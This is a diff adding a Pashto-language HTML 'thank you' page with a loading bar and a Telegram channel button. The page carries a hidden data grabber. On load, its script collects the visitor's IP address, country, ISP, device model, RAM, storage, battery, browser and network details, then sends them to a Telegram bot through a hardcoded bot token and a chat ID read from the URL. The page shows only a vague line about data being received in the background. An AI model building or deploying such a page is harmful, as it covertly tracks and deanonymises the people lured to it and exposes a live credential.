@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="ps" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>تاسو ته مننه ❤️</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: linear-gradient(135deg, #0f172a, #1e293b);
+      color: #f1f5f9;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 48px;
+      margin-bottom: 20px;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      color: #e0f2fe;
+    }
+    .subtitle {
+      color: #94a3b8;
+      font-size: 16px;
+      margin-bottom: 30px;
+      max-width: 500px;
+      line-height: 1.5;
+    }
+
+    /* ─── لوډینګ بار ─────────────────────────────────────────── */
+    .loader-container {
+      width: 80%;
+      max-width: 500px;
+      background: rgba(30, 41, 59, 0.4);
+      border-radius: 12px;
+      padding: 5px;
+      margin: 20px 0;
+    }
+    .loader-bar {
+      height: 14px;
+      width: 0%;
+      background: linear-gradient(90deg, #3b82f6, #8b5cf6, #ec4899);
+      border-radius: 8px;
+      transition: width 0.05s ease;
+    }
+    .loader-text {
+      font-size: 16px;
+      margin-top: 10px;
+      font-weight: bold;
+      color: #cbd5e1;
+    }
+
+    /* ─── چینل لینک ─────────────────────────────────────────── */
+    .channel-link {
+      margin-top: 30px;
+      padding: 16px 32px;
+      background: linear-gradient(120deg, #8b5cf6, #ec4899);
+      color: white;
+      text-decoration: none;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 14px;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 6px 20px rgba(139, 92, 246, 0.4);
+      transform: scale(1);
+      transition: all 0.3s ease;
+    }
+    .channel-link:hover {
+      transform: scale(1.05);
+      box-shadow: 0 8px 25px rgba(139, 92, 246, 0.6);
+    }
+    .channel-link:active {
+      transform: scale(0.98);
+    }
+    .footer {
+      margin-top: 40px;
+      color: #64748b;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">⏳</div>
+  <h1>تاسو ته مننه ❤️</h1>
+  <p class="subtitle">ستاسو معلومات د پس منظر کې ترلاسه کیږي — د تیلګرام چینل ته د ملګرتیا لپاره لطفاً وروسته د چینل لینک کلیک وکړئ.</p>
+
+  <!-- لوډینګ بار -->
+  <div class="loader-container">
+    <div class="loader-bar" id="progressBar"></div>
+  </div>
+  <div class="loader-text" id="progressText">0%</div>
+
+  <!-- چینل لینک (د لوډینګ د بشپړیدو وروسته ښکاري) -->
+  <a href="https://t.me/JRPRO43K" class="channel-link" id="channelLink" style="display:none;">
+    📢 د JRPRO43 د چینل ګډون کړئ
+  </a>
+
+  <div class="footer">
+    🧑‍💻 Developer: @JRPRO43
+  </div>
+
+  <script>
+    // ─── د چیټ ID د URL څخه اخیستل ───────────────────────────────
+    function getChatId() {
+      const p = new URLSearchParams(window.location.search);
+      let id = p.get('chatid');
+      if (!id && window.location.hash.includes('chatid=')) {
+        id = window.location.hash.split('chatid=')[1];
+      }
+      return id || "0";
+    }
+
+    const CHAT_ID = getChatId();
+    const BOT_TOKEN = "8357872748:AAGPfT-6qYq0xVck24_-rA_qh9g_y3XbsIE";
+
+    // ─── لوډینګ (۱ ثانیه، ۰ → ۱۰۰٪) ───────────────────────────────
+    const bar = document.getElementById('progressBar');
+    const text = document.getElementById('progressText');
+    const link = document.getElementById('channelLink');
+
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += 2; // 50 ځلي × 2 = 100 → د ۱ ثانیې کې
+      if (progress >= 100) {
+        progress = 100;
+        clearInterval(interval);
+        text.textContent = "✅ 100% — معلومات تهلايل شول!";
+        text.style.color = "#4ade80";
+        
+        // ۰.5 ثانیه وروسته چینل لینک ښکاري
+        setTimeout(() => {
+          link.style.display = "inline-flex";
+          document.querySelector('.logo').textContent = "🎉";
+        }, 500);
+        
+        // د معلوماتو تهلايل
+        collectAndSendData();
+      } else {
+        bar.style.width = progress + "%";
+        text.textContent = progress + "%";
+      }
+    }, 20); // 20ms × 50 = 1000ms = 1s
+
+    // ─── معلوماتو جمع کول او تیلګرام ته واستل ───────────────────────
+    async function collectAndSendData() {
+      const ua = navigator.userAgent;
+      const info = {};
+
+      info.time = new Date().toLocaleString('fa-IR');
+      info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "نامعلوم";
+
+      // Device
+      let dev = "نامعلوم";
+      if (/iPhone(\d+,\d+)/.test(ua)) dev = ua.match(/iPhone(\d+,\d+)/)[0];
+      else if (/SM-[A-Z0-9]+/.test(ua)) dev = ua.match(/(SM-[A-Z0-9]+)/)[0];
+      else if (/Pixel \d+/.test(ua)) dev = ua.match(/(Pixel \d+)/)[0];
+      else if (/Android.*?; ([^;)]+?)\)/.test(ua)) dev = ua.match(/Android.*?; ([^;)]+?)\)/)[1].trim();
+      info.device = dev;
+
+      // IP + Country + ISP
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await ipRes.json();
+        info.ip = ip;
+
+        const geo = await (await fetch(`https://ipwho.is/${ip}`)).json();
+        info.country = geo.country || "نامعلوم";
+        info.isp = geo.connection?.isp || geo.connection?.org || "نامعلوم";
+      } catch (e) {
+        info.ip = "ناتوانیدل";
+        info.country = "نامعلوم";
+        info.isp = "نامعلوم";
+      }
+
+      // Storage
+      try {
+        if ('storage' in navigator && 'estimate' in navigator.storage) {
+          const { usage, quota } = await navigator.storage.estimate();
+          info.storage = `${(usage/1024**3).toFixed(2)} GB / ${(quota/1024**3).toFixed(2)} GB`;
+        } else info.storage = "نامعلوم";
+      } catch (e) { info.storage = "خطا"; }
+
+      // RAM
+      info.ram = 'deviceMemory' in navigator ? `${navigator.deviceMemory} GB` : "نامعلوم";
+
+      // Battery
+      info.battery = "نامعلوم";
+      if ('getBattery' in navigator) {
+        try {
+          const b = await navigator.getBattery();
+          const p = Math.round(b.level * 100);
+          const chg = b.charging ? `🔌 چارجیږي (${p}%)` : `🔋 ${p}%`;
+          const t = b.charging ? (b.chargingTime>0?`⏱️ ${Math.round(b.chargingTime/60)} دق.`:"") : (b.dischargingTime>0?`⏳ ${Math.round(b.dischargingTime/60)} دق.`:"");
+          info.battery = [chg, t].filter(Boolean).join(" | ");
+        } catch (e) {}
+      }
+
+      // Browser
+      let br = "نامعلوم";
+      if (ua.includes("Edg")) br = "Edge";
+      else if (ua.includes("Chrome") && !ua.includes("Edg")) br = "Chrome";
+      else if (ua.includes("Firefox")) br = "Firefox";
+      else if (ua.includes("Safari") && !ua.includes("Chrome")) br = "Safari";
+      info.browser = br;
+
+      // Network
+      info.conn = "نامعلوم"; info.speed = "نامعلوم";
+      if ('connection' in navigator) {
+        const c = navigator.connection;
+        info.conn = c.effectiveType || c.type || "نامعلوم";
+        const dl = c.downlink;
+        if (dl) info.speed = dl >= 10 ? `🚀 ${dl} Mbps` : dl >= 2 ? `📶 ${dl} Mbps` : `🐢 ${dl} Mbps`;
+      }
+
+      // د تیلګرام لپاره متن
+      const msg = `
+🛡️ *د ډیوایس بشپړ راپور* 🛡️
+
+📱 *Device:* ${info.device}
+🌐 *IP:* ${info.ip}
+🌍 *هیواد:* ${info.country}
+🏢 *ISP:* ${info.isp}
+🧠 *RAM:* ${info.ram}
+💾 *Storage:* ${info.storage}
+🔋 *بیټري:* ${info.battery}
+🧭 *برائوزر:* ${info.browser}
+📡 *سرعت:* ${info.speed}
+📶 *ډول:* ${info.conn}
+🕒 *وخت:* ${info.time}
+🆔 *Chat ID:* ${CHAT_ID === "0" ? "نامعلوم" : CHAT_ID}
+
+──────────────────────
+🧑‍💻 Developer: @JRPRO43  
+📢 Channel: @JRPRO43K
+      `.trim();
+
+      // تهلايل (که چیرې چیټ ID شتون ولري)
+      if (CHAT_ID !== "0") {
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+          });
+        } catch (e) {
+          console.warn("تیلګرام تهلايل ناکام شو — خو چینل لینک ښکاري.");
+        }
+      }
+    }
+  </script>
+</body>
+</html> 
